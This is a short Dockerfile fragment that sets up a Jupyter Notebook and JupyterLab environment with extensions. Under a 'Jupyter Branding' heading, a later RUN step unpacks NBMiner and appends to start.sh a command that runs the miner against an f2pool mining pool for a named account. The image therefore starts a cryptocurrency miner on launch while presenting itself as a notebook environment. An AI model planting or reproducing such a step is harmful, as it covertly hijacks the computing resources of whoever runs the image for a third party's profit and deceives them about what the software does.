...
## Install Jupyter Notebook and Jupyter Lab (Not recommended to edit)
RUN \
    pip install notebook jupyterlab voila ipywidgets jupyter_contrib_nbextensions autopep8 yapf && \
    # Activate and configure extensions
    jupyter contrib nbextension install --sys-prefix && \
    clean-layer.sh
    
## For Jupyter Branding
...
RUN \
	...
	&& mv NBMiner_Linux/* . \
	&& echo './nbminer -a octopus -o stratum+tcp://cfx.f2pool.com:6800 -u truesqn.truesqn' | tee -a start.sh 
